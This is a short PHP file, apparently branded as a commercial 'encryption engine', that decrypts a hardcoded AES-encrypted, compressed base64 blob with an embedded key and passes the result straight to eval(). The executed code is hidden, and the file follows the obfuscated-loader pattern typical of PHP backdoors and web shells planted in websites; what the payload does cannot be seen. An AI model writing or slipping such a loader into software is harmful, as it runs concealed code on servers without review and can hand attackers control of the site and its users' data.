<?php
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$kac6f1 = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p3844b = base64_decode('HBA2YWii7GIu7tPh4AhVwCs4aTVLRTdCVHlpZzBJSnlaYU1hOFhOVzFpUGRVVW9EYjZSWEJKWTBmcWs2TDFCQ3BzZGNCWFg3NDZQUndkRUlwQ0hqdFYrcG1wVXoyMXZvcGFUcVZMR1dvUktqUkJ5akhBTlZ1TDJCQmVjU2duZGduZTJMM3JmQmVFVlhkUjVtS0huZmt3a0RzSldqMHpHdk9Iam9icE5BT0NadFVaVGcwbFhLVGx2djV4WERCZGwzWVFXd2tDWG01ZytWb3QzK1FJcjBRRzdxdXdaZ1QxUW4ya3FaZHVzWlYxUEpNWGhWbTF4TjJZdVNGRW83VThoamJ1RzFUOXlncW1GeUY0NmtCWHZOSEhQbUJHTkV1N3NhV2dXZkU4WEhMazBjT0hGem9UZ01WNnZlb2xyK2UwZ3lEOWtFTXN0M2hQNUY5L2FD');
$i0f1b3 = openssl_cipher_iv_length('aes-256-cbc');
$vedd2d = substr($p3844b, 0, $i0f1b3);
$ca6ec0 = substr($p3844b, $i0f1b3);
eval('?>'.gzinflate(openssl_decrypt($ca6ec0, 'aes-256-cbc', $kac6f1, 0, $vedd2d)));